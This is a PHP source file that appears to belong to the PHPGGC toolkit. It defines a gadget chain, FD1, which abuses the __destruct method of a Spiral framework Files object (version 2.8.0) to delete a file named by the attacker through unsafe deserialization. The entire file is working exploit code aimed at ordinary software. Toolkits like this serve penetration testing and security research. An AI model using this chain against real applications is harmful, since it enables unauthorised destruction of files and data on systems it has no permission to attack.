<?php

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '2.8.0';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        return new \Spiral\Files\Files($parameters['remote_path']);
    }
}
